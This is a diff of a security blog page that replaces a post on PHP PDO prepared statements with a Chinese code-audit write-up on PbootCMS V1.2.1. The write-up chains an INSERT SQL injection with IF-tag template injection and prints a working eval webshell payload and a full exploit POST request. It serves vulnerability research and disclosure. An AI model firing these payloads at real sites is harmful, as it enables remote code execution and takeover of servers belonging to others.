@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="PHP," />
+  <meta name="keywords" content="代码审计," />
 
 
 
@@ -79,22 +79,28 @@
 
 
 
-<meta name="description" content="昨天碰到PDO预编译造成无法sql注入的情况,不是很清楚PDO的处理机制,自己去网上差了些资料,记录一波。   定义：  在生成网页时，许多PHP脚本通常都会执行除参数之外，其他部分完全相同的查询语句，针对这种重复执行一个查询，每次迭代使用不同的参数情况，PDO提供了一种名为预处理语句(prepared statement)的机制。它可以将整个SQL命令向数据库服务器发送一次，以后只有参数发生变">
-<meta name="keywords" content="PHP">
+<meta name="description" content="跟大佬成功学到一招,insert注入进数据库修改留言状态+系统解析IF标签导致Getshell   PbootCMS分析可参考笔者以前的文章:https://p0rz9.github.io/2018/10/15/PbootCMS_V1.2.1详细审计SQL注入/ ##1.有限制的前台代码执行: 漏洞成因: 在前台留言处可利用IF标签插入PHP代码,后台管理员审核(限制)后,在显示到前台时造成代码">
+<meta name="keywords" content="代码审计">
 <meta property="og:type" content="article">
-<meta property="og:title" content="PHP基础 | PDO的来龙去脉">
-<meta property="og:url" content="http://yoursite.com/2018/09/20/PDO的来龙去脉/index.html">
+<meta property="og:title" content="代码审计 | PbootCMS_V1.2.1组合漏洞--&gt;前台无限制命令执行">
+<meta property="og:url" content="http://yoursite.com/2018/10/17/PbootCMS_V1.2.1组合漏洞之前台无限制命令执行/index.html">
 <meta property="og:site_name" content="P0rZ9&#39;s blog">
-<meta property="og:description" content="昨天碰到PDO预编译造成无法sql注入的情况,不是很清楚PDO的处理机制,自己去网上差了些资料,记录一波。   定义：  在生成网页时，许多PHP脚本通常都会执行除参数之外，其他部分完全相同的查询语句，针对这种重复执行一个查询，每次迭代使用不同的参数情况，PDO提供了一种名为预处理语句(prepared statement)的机制。它可以将整个SQL命令向数据库服务器发送一次，以后只有参数发生变">
+<meta property="og:description" content="跟大佬成功学到一招,insert注入进数据库修改留言状态+系统解析IF标签导致Getshell   PbootCMS分析可参考笔者以前的文章:https://p0rz9.github.io/2018/10/15/PbootCMS_V1.2.1详细审计SQL注入/ ##1.有限制的前台代码执行: 漏洞成因: 在前台留言处可利用IF标签插入PHP代码,后台管理员审核(限制)后,在显示到前台时造成代码">
 <meta property="og:locale" content="default">
-<meta property="og:image" content="http://static.zybuluo.com/chhyx/0jgrbzassu76coiknqux219a/image_1cnqcbjn9h7u9h91bkp1phs1j1u9.png">
-<meta property="og:image" content="http://static.zybuluo.com/chhyx/784qcml72336xbr671u6xwtz/image_1cnqcovr0uii7l911241f0k1cr97f.png">
-<meta property="og:image" content="http://static.zybuluo.com/chhyx/jma77nhme7l2ndljbgfx1g8l/image_1cnqcqs5a5pq48n1a25tm718ec7v.png">
-<meta property="og:updated_time" content="2018-09-20T04:59:04.672Z">
+<meta property="og:image" content="http://static.zybuluo.com/chhyx/y2rorr5u2z6l9b056an74xai/image_1cq02djogf9i7iv5t88kb1o1r13.png">
+<meta property="og:image" content="http://static.zybuluo.com/chhyx/3sbr2ji5f6ognq4bni8931k6/image_1cq01gp3qd3m1lii14dajg1e7f9.png">
+<meta property="og:image" content="http://static.zybuluo.com/chhyx/yds22utr7vls2ieea9gpkqao/image_1cq01pm8h130ib1cabh1g5klpc9.png">
+<meta property="og:image" content="http://static.zybuluo.com/chhyx/nydx70lad9cgc0n3axu17o43/image_1cq01s09huhf172n67u18kl1875m.png">
+<meta property="og:image" content="http://static.zybuluo.com/chhyx/rv54ynnytclos27cn3r8dbr0/image_1cq04ojff1qi710tllhq3981bn99.png">
+<meta property="og:image" content="http://static.zybuluo.com/chhyx/xbmnhou6jp2w877deyajy1fe/image_1cq06973213jb11li1cta1l0ps4o3d.png">
+<meta property="og:image" content="http://static.zybuluo.com/chhyx/05koygr7wi11r9am4vbbbqaf/image_1cq05jbedse310ou1s4t1evlif6m.png">
+<meta property="og:image" content="http://static.zybuluo.com/chhyx/gm2f2sxpuz13hpv89hr8npsv/image_1cq05u1j6s1k105up411nq6th713.png">
+<meta property="og:image" content="http://static.zybuluo.com/chhyx/11utg2zml2gxlhyelusxmif0/image_1cq0625m4bi91qh11sqm16ea1mhc30.png">
+<meta property="og:updated_time" content="2018-10-17T07:07:19.415Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="PHP基础 | PDO的来龙去脉">
-<meta name="twitter:description" content="昨天碰到PDO预编译造成无法sql注入的情况,不是很清楚PDO的处理机制,自己去网上差了些资料,记录一波。   定义：  在生成网页时，许多PHP脚本通常都会执行除参数之外，其他部分完全相同的查询语句，针对这种重复执行一个查询，每次迭代使用不同的参数情况，PDO提供了一种名为预处理语句(prepared statement)的机制。它可以将整个SQL命令向数据库服务器发送一次，以后只有参数发生变">
-<meta name="twitter:image" content="http://static.zybuluo.com/chhyx/0jgrbzassu76coiknqux219a/image_1cnqcbjn9h7u9h91bkp1phs1j1u9.png">
+<meta name="twitter:title" content="代码审计 | PbootCMS_V1.2.1组合漏洞--&gt;前台无限制命令执行">
+<meta name="twitter:description" content="跟大佬成功学到一招,insert注入进数据库修改留言状态+系统解析IF标签导致Getshell   PbootCMS分析可参考笔者以前的文章:https://p0rz9.github.io/2018/10/15/PbootCMS_V1.2.1详细审计SQL注入/ ##1.有限制的前台代码执行: 漏洞成因: 在前台留言处可利用IF标签插入PHP代码,后台管理员审核(限制)后,在显示到前台时造成代码">
+<meta name="twitter:image" content="http://static.zybuluo.com/chhyx/y2rorr5u2z6l9b056an74xai/image_1cq02djogf9i7iv5t88kb1o1r13.png">
 
 
 
@@ -124,13 +130,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/09/20/PDO的来龙去脉/"/>
+  <link rel="canonical" href="http://yoursite.com/2018/10/17/PbootCMS_V1.2.1组合漏洞之前台无限制命令执行/"/>
 
 
 
 
 
-  <title>PHP基础 | PDO的来龙去脉 | P0rZ9's blog</title>
+  <title>代码审计 | PbootCMS_V1.2.1组合漏洞-->前台无限制命令执行 | P0rZ9's blog</title>
   
 
 
@@ -241,7 +247,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/09/20/PDO的来龙去脉/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/10/17/PbootCMS_V1.2.1组合漏洞之前台无限制命令执行/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="P0rZ9">
@@ -258,7 +264,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">PHP基础 | PDO的来龙去脉</h1>
+          <h1 class="post-title" itemprop="name headline">代码审计 | PbootCMS_V1.2.1组合漏洞-->前台无限制命令执行</h1>
         
 
         <div class="post-meta">
@@ -270,8 +276,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-20T08:15:41+08:00">
-                2018-09-20
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-10-17T08:15:41+08:00">
+                2018-10-17
               </time>
             
 
@@ -314,56 +320,80 @@
 
       
         <blockquote>
-<p>昨天碰到PDO预编译造成无法sql注入的情况,不是很清楚PDO的处理机制,自己去网上差了些资料,记录一波。</p>
+<p>跟大佬成功学到一招,insert注入进数据库修改留言状态+系统解析IF标签导致Getshell</p>
 </blockquote>
 <hr>
-<p><strong>定义：</strong></p>
-<blockquote>
-<p>在生成网页时，许多PHP脚本通常都会执行除参数之外，其他部分完全相同的查询语句，针对这种重复执行一个查询，每次迭代使用不同的参数情况，PDO提供了一种名为预处理语句(prepared statement)的机制。它可以将整个SQL命令向数据库服务器发送一次，以后只有参数发生变化，数据库服务器只需对命令的结构做一次分析就够了，即编译一次，可以多次执行。</p>
-</blockquote>
-<p><strong>准备语句:</strong><br>重复执行一个SQL查询，通过每次迭代使用不同的参数,在PDO中有两种使用占位符的语法：“命令参数”和“问号参数”<br>A.使用命名参数作为占位符:</p>
-<pre><code>$link = $dbh-&gt;prepare(&quot;INSERT INTO contactInto(name,address,phone)VALUES (:name,:address,:phone)&quot;);
-</code></pre><p>B.使用?作为占位符:</p>
-<pre><code>$link = $dbh-&gt;prepare(&quot;INSERT INTO contactInfo(name,address,phone) VALUES (?,?,?)&quot;);
-</code></pre><p>不管是否使用了占位符,都需要使用PDO对象中的prepare()方法，去准备这个将要用于迭代执行的查询，并返回一个PDOStatement类对象</p>
-<p><strong>绑定参数:</strong><br>A.当sql语句在数据库服务端准备好了一个”sql”语句后,如果使用了占位符,就需要在每次执行时替换输入的参数,可通过PDOStatement对象中的bindParam()或者bindValue()方法,把参数变量绑定到准备好的占位符上<br>    <strong>bindParam()</strong>:<br>    分别绑定上对应的参数</p>
-<pre><code>$link-&gt;bindParam(&quot;:name&quot;,$name);//使用命名参数绑定参数的情况
-$link-&gt;bindParam(&quot;1&quot;,$name);//使用?绑定参数的情况
-</code></pre><p>B.区别:<br>   bindParam()只有在PDOStatement::execute()被调用的时候才取其值<br>C.实例:</p>
-<pre><code>$id = 1;
-$st-&gt;bindParam(1,$id,PDO::PARAM_INT);
-$id = 2;    
-$st-&gt;execute();
-</code></pre><p>使用bindParam()取得是id=2的值 而bindValue()取得是id=1的值</p>
-<p><strong>执行查询:</strong><br>通过调用PDOStatement类对象中的execute()方法去反复执行在数据库缓存区准备好的语句</p>
-<pre><code>$st-&gt;execute();
-</code></pre><p><strong>PDO防止sql注入：</strong></p>
-<ol>
-<li>需要设置<code>$pdo-&gt;setAttribute(PDO::ATTR_EMULATE_PREPARES,false)</code></li>
-</ol>
-<blockquote>
-<p>PDO几乎为所支持的所有数据库提供了命令占位符模拟,甚至可以为生来就不支持该概念的数据库模拟预处理语句和绑定参数。如果说开启了模拟预处理(即参数值为true),那么PDO内部会模拟参数绑定的过程,SQL语句是在最后execute()的时候才发送给数据库执行；如果我这里设置了PDO::ATTR_EMULATE_PREPARES =&gt; false，那么PDO不会模拟预处理，参数化绑定的整个过程都是和Mysql交互进行的,来阻止sql注入</p>
-</blockquote>
-<p>2.我们解释下两种交互过程:<br>A.模拟预处理:<br>客户端本地执行预处理的模拟，最终将拼好的sql语句发送到mysql服务器进行执行<br>B.本地预处理:<br>分两步进行:<br>a.prepare()阶段:发送带有占位符的sql语句到mysql服务器(parsing-&gt;resolution)<br>b.多次发送占位符参数给mysql服务器进行执行(多次执行optimization-&gt;execution)</p>
-<p>3.如出现sql语句错误: 使用本地预处理：是在prepare()阶段就会检测出sql语句的错误   使用模拟预处理: 只有在exec阶段才能发现(拼接好sql语句 在exec阶段才会发送给mysql服务器)</p>
-<p>本地预处理:</p>
-<pre><code>    &lt;?php
-$params = [
-    PDO::ATTR_ERRMODE           =&gt; PDO::ERRMODE_EXCEPTION,//开启错误模式
-    PDO::ATTR_EMULATE_PREPARES  =&gt; false,
-];
+<p>PbootCMS分析可参考笔者以前的文章:<br><a href="https://p0rz9.github.io/2018/10/15/PbootCMS_V1.2.1%E8%AF%A6%E7%BB%86%E5%AE%A1%E8%AE%A1SQL%E6%B3%A8%E5%85%A5/" target="_blank" rel="noopener">https://p0rz9.github.io/2018/10/15/PbootCMS_V1.2.1详细审计SQL注入/</a></p>
+<p>##<strong>1.有限制的前台代码执行:</strong></p>
+<p>漏洞成因:</p>
+<pre><code>在前台留言处可利用IF标签插入PHP代码,后台管理员审核(限制)后,在显示到前台时造成代码执行
+</code></pre><p>代码分析:<br>追踪解析<code>IF</code>标签的函数:</p>
+<pre><code>apps\home\controller\ParserController.php
+</code></pre><p><img src="http://static.zybuluo.com/chhyx/y2rorr5u2z6l9b056an74xai/image_1cq02djogf9i7iv5t88kb1o1r13.png" alt="image_1cq02djogf9i7iv5t88kb1o1r13.png-115.2kB"></p>
+<p>漏洞利用:<br>a.留言处插入我们的<code>php</code>代码:<code>{pboot:if(eval($_POST[z]))}!!!{/pboot:if}</code><br><img src="http://static.zybuluo.com/chhyx/3sbr2ji5f6ognq4bni8931k6/image_1cq01gp3qd3m1lii14dajg1e7f9.png" alt="image_1cq01gp3qd3m1lii14dajg1e7f9.png-71.5kB"></p>
+<p>b.管理员在后台审核,点击显示按钮后<br><img src="http://static.zybuluo.com/chhyx/yds22utr7vls2ieea9gpkqao/image_1cq01pm8h130ib1cabh1g5klpc9.png" alt="image_1cq01pm8h130ib1cabh1g5klpc9.png-63.6kB"></p>
+<p>c.返回前台触发漏洞:<br><img src="http://static.zybuluo.com/chhyx/nydx70lad9cgc0n3axu17o43/image_1cq01s09huhf172n67u18kl1875m.png" alt="image_1cq01s09huhf172n67u18kl1875m.png-40.4kB"></p>
+<p>因为这里需要管理员点击才能触发,所以显得有些鸡肋,但是这里我们可利用<code>insert</code>注入在插入数据库时就改变其显示状态来进行漏洞利用<br><img src="http://static.zybuluo.com/chhyx/rv54ynnytclos27cn3r8dbr0/image_1cq04ojff1qi710tllhq3981bn99.png" alt="image_1cq04ojff1qi710tllhq3981bn99.png-247.6kB"></p>
+<p>##<strong>2.留言处<code>insert</code>注入:</strong><br>漏洞成因:</p>
+<pre><code>使用有问题的底层`insert`操作,对数组的`key`值无过滤且直接拼接导致`SQL注入`问题
+</code></pre><p>代码分析:<br>定位到留言的操作的文件</p>
+<pre><code>#apps\home\controller\MessageController.php add()函数
+public function add()
+{...
+    if ($_POST) {
 
-$db = new PDO(&apos;mysql:dbname=tp;host=127.0.0.1;&apos;, &apos;root&apos;, &apos;root&apos;, $params);
+        if (time() - session(&apos;lastsub&apos;) &lt; 10) {
+            alert_back(&apos;您提交太频繁了，请稍后再试！&apos;);
+        }
+        // 验证码验证
+        // 读取字段
+        if (! $form = $this-&gt;model-&gt;getFormField(1)) {
+            alert_back(&apos;留言表单不存在任何字段，请核对后重试！&apos;);
+        }
+        // 接收数据
+        $mail_body = &apos;&apos;;
+        foreach ($form as $value) {
+            $field_data = post($value-&gt;name);
 
-try {
-    $link = $db-&gt;prepare(&apos;SELECT * FROM user WHERE id in (:where_id, updatexml(0,concat(0xa,user()),0))&apos;);
-} catch (\PDOException $e) {
-    var_dump($e);//打印错误信息
-}
-</code></pre><p>虽然只执行了prepare()函数 但是sql语句也成功报错<br><img src="http://static.zybuluo.com/chhyx/0jgrbzassu76coiknqux219a/image_1cnqcbjn9h7u9h91bkp1phs1j1u9.png" alt="image_1cnqcbjn9h7u9h91bkp1phs1j1u9.png-47.4kB"></p>
-<p>模拟预处理:<br>未报错:<br><img src="http://static.zybuluo.com/chhyx/784qcml72336xbr671u6xwtz/image_1cnqcovr0uii7l911241f0k1cr97f.png" alt="image_1cnqcovr0uii7l911241f0k1cr97f.png-53.2kB"></p>
-<p>执行execute()报错:<br><img src="http://static.zybuluo.com/chhyx/jma77nhme7l2ndljbgfx1g8l/image_1cnqcqs5a5pq48n1a25tm718ec7v.png" alt="image_1cnqcqs5a5pq48n1a25tm718ec7v.png-84.5kB"></p>
-<p><strong>参考链接:</strong><br>1.<a href="https://www.cnblogs.com/alazalazalaz/p/6056393.html" target="_blank" rel="noopener">https://www.cnblogs.com/alazalazalaz/p/6056393.html</a><br>2.<a href="https://www.cnblogs.com/tinywan/p/6143889.html" target="_blank" rel="noopener">https://www.cnblogs.com/tinywan/p/6143889.html</a><br>3.<a href="https://blog.csdn.net/a7442358/article/details/45268489" target="_blank" rel="noopener">https://blog.csdn.net/a7442358/article/details/45268489</a></p>
+            if (is_array($field_data)) { // 如果是多选等情况时转换
+                $field_data = implode(&apos;,&apos;, $field_data);//数组合并为字符串
+            }
+            if ($value-&gt;required &amp;&amp; ! $field_data) {
+                alert_back($value-&gt;description . &apos;不能为空！&apos;);
+            } else {
+                $data[$value-&gt;name] = post($value-&gt;name);   //关键点
+                $mail_body .= $value-&gt;description . &apos;：&apos; . post($value-&gt;name) . &apos;&lt;br&gt;&apos;;
+            }
+        }
+
+        // 设置额外数据
+        if ($data) {
+            $data[&apos;acode&apos;] = session(&apos;lg&apos;);
+            $data[&apos;user_ip&apos;] = ip2long(get_user_ip());
+            $data[&apos;user_os&apos;] = get_user_os();
+            $data[&apos;user_bs&apos;] = get_user_bs();
+            $data[&apos;recontent&apos;] = &apos;&apos;;
+            $data[&apos;status&apos;] = 0;
+            $data[&apos;create_user&apos;] = &apos;guest&apos;;
+            $data[&apos;update_user&apos;] = &apos;guest&apos;;
+        }
+
+        if ($this-&gt;model-&gt;addMessage($data)) {//跟进addmessage()
+...
+</code></pre><p>跟进<code>addMessage()</code>函数 </p>
+<pre><code>public function addMessage($data)
+   {
+       return parent::table(&apos;ay_message&apos;)-&gt;autoTime()-&gt;insert($data);
+   }
+</code></pre><p>跟进insert():<br><img src="http://static.zybuluo.com/chhyx/xbmnhou6jp2w877deyajy1fe/image_1cq06973213jb11li1cta1l0ps4o3d.png" alt="image_1cq06973213jb11li1cta1l0ps4o3d.png-90.2kB"></p>
+<p>因为底层<code>insert</code>操作对数组的<code>key</code>值无过滤且直接拼接导致<code>SQL注入</code>问题</p>
+<p>SQL漏洞利用:<br><img src="http://static.zybuluo.com/chhyx/05koygr7wi11r9am4vbbbqaf/image_1cq05jbedse310ou1s4t1evlif6m.png" alt="image_1cq05jbedse310ou1s4t1evlif6m.png-91kB"></p>
+<p>##<strong>3.组合漏洞—前台无限制命令执行:</strong></p>
+<pre><code>url:http://127.0.0.1:81/index.php/Message/add
+
+POST:content=1&amp;mobile=1&amp;contacts[acode`,`mobile`,`content`,`user_ip`,`user_os`,`user_bs`,`recontent`,`status`,`create_user`,`update_user`,`create_time`,`update_time`) VALUES (&apos;cn&apos;,&apos;1&apos;,0x7B70626F6F743A6966286576616C28245F504F53545B7A5D29297D2121217B2F70626F6F743A69667D,&apos;1&apos;,&apos;1&apos;,&apos;1&apos;,&apos;1&apos;,&apos;1&apos;,&apos;1&apos;,&apos;1&apos;,&apos;1&apos;,&apos;1&apos;); -- a] = 1&amp;checkcode=xxxx
+</code></pre><p>填写验证码点击提交后抓包：<br><img src="http://static.zybuluo.com/chhyx/gm2f2sxpuz13hpv89hr8npsv/image_1cq05u1j6s1k105up411nq6th713.png" alt="image_1cq05u1j6s1k105up411nq6th713.png-182.7kB"></p>
+<p>可看到新插入的留言状态(<code>status</code>)为1<br>返回前台成功利用:<br><img src="http://static.zybuluo.com/chhyx/11utg2zml2gxlhyelusxmif0/image_1cq0625m4bi91qh11sqm16ea1mhc30.png" alt="image_1cq0625m4bi91qh11sqm16ea1mhc30.png-45.8kB"></p>
 
       
     </div>
@@ -381,7 +411,7 @@ try {
       
         <div class="post-tags">
           
-            <a href="/tags/PHP/" rel="tag"># PHP</a>
+            <a href="/tags/代码审计/" rel="tag"># 代码审计</a>
           
         </div>
       
@@ -394,8 +424,8 @@ try {
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/09/19/ThinkPHP设计缺陷泄露账户密码+鸡肋sql注入/" rel="next" title="代码审计 | ThinkPHP设计缺陷泄露账户密码+鸡肋sql注入">
-                <i class="fa fa-chevron-left"></i> 代码审计 | ThinkPHP设计缺陷泄露账户密码+鸡肋sql注入
+              <a href="/2018/10/15/SQL注入基础/" rel="next" title="基础知识 | SQL注入基础">
+                <i class="fa fa-chevron-left"></i> 基础知识 | SQL注入基础
               </a>
             
           </div>
@@ -403,10 +433,6 @@ try {
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/09/20/代码审计Day3 - 实例化任意对象漏洞/" rel="prev" title="代码审计Day3 - 实例化任意对象漏洞">
-                代码审计Day3 - 实例化任意对象漏洞 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
